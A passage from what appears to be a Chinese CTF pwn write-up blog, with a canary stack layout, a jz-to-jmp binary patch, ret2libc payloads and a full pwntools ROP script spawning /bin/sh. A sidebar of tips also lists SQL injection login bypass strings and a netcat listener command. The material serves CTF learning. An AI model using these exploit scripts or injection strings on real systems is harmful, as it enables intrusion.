+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">locret_1216:</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 11BD</span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">_text ends</span><br></pre></td></tr></table></figure>
+
+<p><code>mov rax, fs:28h</code>：读取 Canary</p>
+<p><code>mov [rbp+var_8], rax</code>：将canary保存到 var_8</p>
+<p>栈空间的排列</p>
+<p>高地址 ↑</p>
+<ul>
+<li>返回地址：8 字节 <code>[rbp+8]</code></li>
+<li>保存的 RBP：8 字节 <code>[rbp]</code></li>
+<li>Canary：8 字节 <code>[rbp-8]</code> 到 <code>[rbp-1]</code></li>
+<li>缓冲区 buf：88 字节 <code>[rbp-0x60]</code> 到 <code>[rbp-0x9]</code></li>
+</ul>
+<p>低地址 ↓</p>
+<p>故从 buf 起始位置到返回地址的偏移是 0x68，即 104 字节。</p>
+<p>jz 是 Jump if Zero，即“结果为零就跳转”。</p>
+<p>而我们要做的就是将jz改为jmp（无条件跳转）</p>
+<p>在IDA中看到jz那行命令的地址是0x120f</p>
+<p>又jmp的机器码是eb，故改完后是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROUNDS = [</span><br><span class="line">    (<span class="number">0x120f</span>, <span class="number">0xeb</span>, <span class="string">&#x27;k1&#x27;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>由于题目已经帮我们找好了libc基址，故只需要找偏移就行</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system offset: 0x58750</span><br><span class="line">/bin/sh offset: 0x1cc42f</span><br><span class="line">ret offset: 0x28a92</span><br><span class="line">pop rdi; ret offset: 0x10c08d</span><br></pre></td></tr></table></figure>
+
+<p>再编写payload</p>
+<p>错误示例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>(<span class="params">kind, libc_base</span>):</span><br><span class="line">    system = libc_base + <span class="number">0x58750</span></span><br><span class="line">    binsh  = libc_base + <span class="number">0x1cc42f</span></span><br><span class="line">    ret    = libc_base + <span class="number">0x28a92</span></span><br><span class="line">    pop_rdi = libc_base + <span class="number">0x10c08d</span></span><br><span class="line">    payload = (</span><br><span class="line">    <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">    + p64(ret)</span><br><span class="line">    + p64(pop_rdi)</span><br><span class="line">    + p64(binsh)</span><br><span class="line">    + p64(system)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>由于本题与之前的不同，经锤子后得知需要让程序输出flag内容，不只是拿到&#x2F;bin&#x2F;sh</p>
+<p>最终payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>(<span class="params">kind, libc_base</span>):</span><br><span class="line">    system = libc_base + <span class="number">0x58750</span></span><br><span class="line">    binsh  = libc_base + <span class="number">0x1cc42f</span></span><br><span class="line">    ret    = libc_base + <span class="number">0x28a92</span></span><br><span class="line">    pop_rdi = libc_base + <span class="number">0x10c08d</span></span><br><span class="line">    payload = (</span><br><span class="line">    <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">    + p64(ret)</span><br><span class="line">    + p64(pop_rdi)</span><br><span class="line">    + p64(binsh)</span><br><span class="line">    + p64(system)</span><br><span class="line">    )</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;cat flag\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn–rop-ret2text"><a href="#pwn–rop-ret2text" class="headerlink" title="pwn–rop+ret2text"></a>pwn–rop+ret2text</h2><p>依旧是上次卡了8h的题</p>
+<p>续接上次思路，上次将二段读理解成重新返回take_massage的地址，使其再次触发只能读取24字节的read</p>
+<p>经过CSDN和gpt的帮助，也是成功了解到是重新构造一个read，修改他的rdx，从而修改其读的字节数然后再构造rop链</p>
+<p>由于rsi一开始没变，还是rbp-0x58，故要覆盖前面所写的112个字节，，然后再写入我们构造的rop链</p>
+<p>填入我们之前已经找好的地址（<code>ROPgadget --binary ./pwn --only &quot;pop|ret&quot;</code>　　<code>objdump -d ./pwn |grep &#39;system@plt&#39;</code>）</p>
+<p>攻击脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">35189</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x401250</span></span><br><span class="line">pop_rsi = <span class="number">0x401252</span></span><br><span class="line">pop_rdx = <span class="number">0x401254</span></span><br><span class="line">ret     = <span class="number">0x40101a</span></span><br><span class="line">read    = <span class="number">0x401090</span></span><br><span class="line">system  = <span class="number">0x401080</span></span><br><span class="line">bss     = <span class="number">0x4040A1</span></span><br><span class="line">rop = (</span><br><span class="line">    p64(pop_rdi) + p64(<span class="number">0</span>) +</span><br><span class="line">    p64(pop_rsi) + p64(bss) +</span><br><span class="line">    p64(pop_rdx) + p64(<span class="number">0x8</span>) +</span><br><span class="line">    p64(read) +</span><br><span class="line">    p64(pop_rdi) + p64(bss) +</span><br><span class="line">    p64(ret) +</span><br><span class="line">    p64(system)</span><br><span class="line">)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span> + rop</span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x58</span> + p64(pop_rdx) + p64(<span class="built_in">len</span>(payload2)) + p64(read)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<!-- pages: 11 -->
+</div>
+
+        
+        <div class="post-tags">
+          <span class="post-tags-label">#</span>
+          
+          <a class="chip" href="/tags/Pwn/">Pwn</a>
+          
+          <a class="chip" href="/tags/pwntools/">pwntools</a>
+          
+          <a class="chip" href="/tags/shellcode/">shellcode</a>
+          
+          <a class="chip" href="/tags/XOR/">XOR</a>
+          
+          <a class="chip" href="/tags/ret2libc/">ret2libc</a>
+          
+          <a class="chip" href="/tags/canary/">canary</a>
+          
+        </div>
+        
+
+        <div class="post-end">
+          <span class="post-end-line"></span>
+          <span class="post-end-text">EOF</span>
+          <span class="post-end-line"></span>
+        </div>
+
+        <nav class="post-nav">
+          
+          <a class="post-nav-item" href="/2026/11/22/php-unserialize-pop/">
+            <span class="post-nav-dir">← 上一篇</span>
+            <span class="post-nav-title">PHP 序列化与反序列化（POP 链）</span>
+          </a>
+          
+          
+          <a class="post-nav-item post-nav-next" href="/2026/11/20/pwn-rop-ret2text/">
+            <span class="post-nav-dir">下一篇 →</span>
+            <span class="post-nav-title">pwn--rop+ret2text</span>
+          </a>
+          
+        </nav>
+
+        
+
+<section class="comments" id="comments">
+  <div class="comments-head">
+    <h2 class="comments-title"><span class="t-prompt">//</span> 评论</h2>
+    <span class="comments-sub">用 GitHub 账号登录后发言</span>
+  </div>
+  <div class="giscus-wrap">
+    <script src="https://giscus.app/client.js"
+      data-repo="whymm-fl/whymm-fl.github.io"
+      data-repo-id="R_kgDOVvROcA"
+      data-category="Announcements"
+      data-category-id="DIC_kwDOVvROcM4DLPtx"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="dark"
+      data-lang="zh-CN"
+      crossorigin="anonymous"
+      async>
+    </script>
+  </div>
+</section>
+
+
+      </div>
+
+      
+      <aside class="post-aside">
+        <div class="toc-wrap">
+          <div class="toc-title"><span>目录</span><b>TOC</b></div>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E2%80%93tiny%E2%80%93XOR%E8%A7%A3%E7%A0%81"><span class="toc-text">pwn–tiny–XOR解码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93ret2libc%E2%80%93canary%E7%BB%95%E8%BF%87"><span class="toc-text">pwn–ret2libc–canary绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-text">阅读题目信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-text">检查保护机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn%E2%80%93rop-ret2text"><span class="toc-text">pwn–rop+ret2text</span></a></li></ol></li></ol>
+        </div>
+      </aside>
+      
+    </div>
+  </div>
+</article>
+</main>
+  
+
+<section class="quote-band" aria-label="名言与小知识">
+  <div class="wrap">
+    <div class="quote-card" id="quoteCard">
+      <div class="quote-mark" aria-hidden="true">&ldquo;</div>
+      
+      <p class="quote-text" id="quoteText">Debugging is twice as hard as writing the code in the first place.</p>
+      <p class="quote-author" id="quoteAuthor">&mdash; Brian W. Kernighan</p>
+      
+      
+      <p class="quote-tip"><span class="quote-tip-label">// 小知识</span><span id="quoteTip"><code>curl -s -o /dev/null -w "%{http_code}" &lt;url&gt;</code> 只看状态码，批量探活很省事。</span></p>
+      
+    </div>
+  </div>
+</section>
+<script type="application/json" id="quoteData">{"quotes":[{"text":"Talk is cheap. Show me the code.","author":"Linus Torvalds"},{"text":"Simplicity is prerequisite for reliability.","author":"Edsger W. Dijkstra"},{"text":"Premature optimization is the root of all evil.","author":"Donald Knuth"},{"text":"Programs must be written for people to read, and only incidentally for machines to execute.","author":"Harold Abelson"},{"text":"Security is a process, not a product.","author":"Bruce Schneier"},{"text":"Debugging is twice as hard as writing the code in the first place.","author":"Brian W. Kernighan"},{"text":"Any sufficiently advanced technology is indistinguishable from magic.","author":"Arthur C. Clarke"},{"text":"Make it work, make it right, make it fast.","author":"Kent Beck"},{"text":"纸上得来终觉浅，绝知此事要躬行。","author":"陆游"},{"text":"Stay hungry, stay foolish.","author":"Steve Jobs"},{"text":"落日心犹壮，秋风病欲苏。","author":"杜甫"},{"text":"为天地立心，为生民立命，为往圣继绝学，为万世开太平。","author":"张载"},{"text":"应是天仙狂醉，乱把白云揉碎。","author":"李白"}],"tips":["\u003ccode\u003ecurl -s -o /dev/null -w \"%{http_code}\" \u0026lt;url\u0026gt;\u003c/code\u003e 只看状态码，批量探活很省事。","\u003ccode\u003epython3 -m http.server 8000\u003c/code\u003e 一句话起个文件服务，传 payload 最方便。","\u003ccode\u003estrings -n 8 ./chall | less\u003c/code\u003e 先抓二进制里的可见字符串，比手动翻快得多。","\u003ccode\u003ebinwalk -e firmware.bin\u003c/code\u003e 解固件，\u003ccode\u003eexiftool pic.jpg\u003c/code\u003e 看图片元数据。","\u003ccode\u003etcpdump -i any -w out.pcap port 80\u003c/code\u003e 抓包，Wireshark 里按 \u003ccode\u003ehttp.request\u003c/code\u003e 过滤。","登录框先试 \u003ccode\u003e' or 1=1-- -\u003c/code\u003e、\u003ccode\u003eadmin' -- -\u003c/code\u003e，能进就是字符型注入。","\u003ccode\u003egit log -p --all\u003c/code\u003e 能在 \u003ccode\u003e.git\u003c/code\u003e 泄露的题目里翻出被删掉的 flag。","\u003ccode\u003enc -lvnp 4444\u003c/code\u003e 起监听前，先确认目标能不能出网。","拿到 RSA 密文先看长度：e、n 大小不对劲往往就是攻击点。","\u003ccode\u003egrep -rn \"flag{\" .\u003c/code\u003e 是赛后复盘找遗漏的最快方式。"]}</script>
+
+
+  <footer class="site-footer">
+  <div class="wrap">
+    <div class="footer-grid">
+      <div class="footer-about">
+        <div class="footer-brand">whymm<span class="caret">_</span></div>
+        <p class="footer-motto">Stay curious, keep pwning.</p>
+      </div>
+      <div class="footer-nav">
+        <div class="footer-nav-col">
+          <div class="footer-label">// 导航</div>
+          
+          <a href="/">首页</a>
+          
+          <a href="/archives/">归档</a>
+          
+          <a href="/categories/">分类</a>
+          
+          <a href="/tags/">标签</a>
+          
+          <a href="/about/">关于</a>
+          
+        </div>
+        <div class="footer-nav-col">
+          <div class="footer-label">// 联系</div>
+          
+          <a href="https://github.com/whymm-fl" target="_blank" rel="noopener">GitHub</a>
+          
+          
+          <a href="/atom.xml">RSS 订阅</a>
+          <a href="/sitemap.xml">站点地图</a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <span>© 2026 whymm</span>
+      <span class="dot-sep">·</span>
+      <span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a></span>
+      <span class="dot-sep">·</span>
+      <span>Theme <b>whymm</b></span>
+      
+      <span class="footer-stats" id="busuanzi_container_site_pv" style="display:none"><span class="dot-sep">·</span><span id="busuanzi_value_site_pv">0</span> 次访问</span>
+      <span class="footer-stats" id="busuanzi_container_site_uv" style="display:none"><span class="dot-sep">·</span><span id="busuanzi_value_site_uv">0</span> 位访客</span>
+      
+    </div>
+  </div>
+</footer>
+
+  <div class="search-layer" id="searchLayer" aria-hidden="true">
+  <div class="search-backdrop" data-close="search"></div>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-head">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg>
+      <input id="searchInput" type="search" placeholder="搜索标题、分类、标签或正文…" autocomplete="off" spellcheck="false" data-search-url="/search.json">
+      <button class="search-close" type="button" data-close="search" aria-label="关闭">ESC</button>
+    </div>
+    <div class="search-body" id="searchResults">
+      <div class="search-empty">
+        <div class="search-empty-icon">⌘K</div>
+        <p>输入关键词开始搜索</p>
+        <span>支持标题、分类、标签与正文全文匹配</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <button class="to-top" id="toTop" type="button" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+  </button>
+  <div class="img-viewer" id="imgViewer" aria-hidden="true"><img alt=""></div>
+  <script src="/js/main.js" defer></script>
+  <script src="/js/search.js" defer></script>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+</body>
+</html>
